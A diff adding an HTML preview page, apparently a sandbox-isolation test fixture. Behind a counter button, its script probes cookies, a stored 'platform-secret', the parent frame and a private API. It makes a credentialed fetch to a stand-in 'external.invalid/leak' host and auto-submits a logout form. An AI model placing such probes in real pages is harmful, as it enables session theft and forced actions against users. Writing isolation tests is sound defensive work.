@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="Content-Security-Policy" content="default-src * data: blob: 'unsafe-inline'">
+  <base href="https://external.invalid/">
+  <style>body { color: rgb(29, 29, 31); }</style>
+</head>
+<body>
+  <h1>成功版本预览</h1>
+  <button id="counter">0</button>
+  <script>
+    const button = document.getElementById('counter');
+    button.onclick = () => { button.textContent = String(Number(button.textContent) + 1); };
+    (async () => {
+      const checks = {};
+      function probe(name, read) {
+        try { checks[name] = String(read()); }
+        catch { checks[name] = 'blocked'; }
+      }
+      probe('cookie', () => document.cookie);
+      probe('storage', () => localStorage.getItem('platform-secret'));
+      if (parent !== window) probe('parent', () => parent.document.body.textContent);
+      for (const [name, url] of [['api', '/api/users/me'], ['external', 'https://external.invalid/leak']]) {
+        try {
+          checks[name] = await (await fetch(url, { credentials: 'include' })).text();
+        } catch { checks[name] = 'blocked'; }
+      }
+      checks.image = await new Promise(resolve => {
+        const image = new Image();
+        image.onload = () => resolve('loaded');
+        image.onerror = () => resolve('blocked');
+        image.src = '/api/private.png';
+        document.body.appendChild(image);
+      });
+      const form = document.createElement('form');
+      form.action = '/api/users/logout';
+      form.method = 'POST';
+      document.body.appendChild(form);
+      form.submit();
+      await new Promise(resolve => requestAnimationFrame(() => requestAnimationFrame(resolve)));
+      document.body.dataset.checks = JSON.stringify(checks);
+      document.body.dataset.ready = 'true';
+    })();
+  </script>
+</body>
+</html>
